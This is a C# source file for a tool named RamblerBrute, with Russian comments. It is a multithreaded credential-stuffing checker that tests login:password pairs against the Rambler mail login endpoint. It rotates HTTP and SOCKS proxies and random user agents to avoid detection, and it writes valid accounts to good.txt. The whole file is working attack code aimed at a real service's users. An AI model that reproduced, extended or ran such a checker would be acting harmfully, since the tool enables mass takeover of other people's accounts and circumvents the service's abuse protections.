using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xNet.Net;


namespace RamblerBrute
{
    public class Checker//класс проверки учетки
    {
        private Thread[] _threads;
        private readonly Object _syncIndex = new Object();
        private readonly Object _syncFiles = new Object();

        private static string Check(string login, string password, string domain)
                    {
            try
            {
                using (var request = new HttpRequest())//http запрос
                {
                    if (Globals.TypeProxy == 1)//подключаем нужный тип прокси
                    {
                        request.Proxy = HttpProxyClient.Parse(GetProxy());
                    }
                    else if (Globals.TypeProxy == 2)
                    {
                        request.Proxy = Socks4ProxyClient.Parse(GetProxy());
                    }
                    else if (Globals.TypeProxy == 3)
                    {
                        request.Proxy = Socks5ProxyClient.Parse(GetProxy());
                    }

                    request.AllowAutoRedirect = false;//запретили редирект 
                    request.UserAgent = HttpHelper.RandomUserAgent();   //юзвер агент

                    HttpResponse response = request.Post("https://id.rambler.ru/login/iframe", "show=iframe&profile.login=" + login + "&profile.domain="+ domain +"&profile.password=" + password + "&button.submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8");
                    if (response.Cookies.ContainsKey("rha"))
                    {
                        return "true";
                    }
                    else
                    {
                        return "false";
                    }
                }

            }
            catch 
            {
                Check(login, password, domain);
            }
            return "";

       }
        //public void CreateThreads();
        
        public void CreateThreads()
        {
            _threads = new Thread[100];
            if (Globals.CountThreads > 100)
            {throw new Exception("Дохера потоков!(более 100)");}
            for (int i = 0; i < Globals.CountThreads; i++)
            {
                _threads[i] = new Thread(Checking) {IsBackground = true};
                _threads[i].Start();
            }
        }

        public void StopThreads()
        {
            for (int i = 0; i < Globals.CountThreads; i++)
            {
                //_threads[i].Abort();
                if (_threads[i] != null) _threads[i].Abort();
            }
        }
        public int AliveThreads()
        {
            try
            {
                int count = 0;
                for (int i = 0; i < Globals.CountThreads; i++)
                {
                    if (_threads[i].IsAlive)
                    {
                        count++;
                    }
                }
                return count;
            }
            catch
            {
                return 0;
                }
        }
        private static int _index = -2;
        private void Checking()
        {
            while (true)
            {
                lock (_syncIndex)
                {
                    _index++;
                }
                if (_index > Globals.CountSource)
                {break;}
                //MessageBox.Show((string)Globals.Source[index]);
                var line = Globals.Source[_index].ToString().Split(Convert.ToChar(Globals.TxtDelimiter));//login;password        line 0 = login      line 1 = password
                var line1 = line[0].Split(Convert.ToChar("@"));
                string resp = Check(line1[0], line[1], line1[1]);
                lock (_syncFiles)
                {
                    if (resp == "true")  //good
                    {
                        SaveText("good.txt", Globals.Source[_index].ToString());
                        Globals.CountGood += 1;
                    }
                    else//bad
                    {
                        SaveText("bad.txt", Globals.Source[_index].ToString());
                        Globals.CountBad += 1;
                    }
                }
                
                Globals.Pps += 1;
            }
        }
        private void SaveText(string file, string text)
        {
            try
            {
                var write = new StreamWriter(file, true);
                write.WriteLine(text);
                write.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }
        private static string GetProxy()
        {
            var rnd = new Random();//генератор случайных чисел
            return Convert.ToString(Globals.Proxy[rnd.Next(0, Globals.Proxy.Count)]);//генерируется число от 0 до числа элементов в списке прокси (возвращает случайный элемент массива прокси)
        }
    }
}
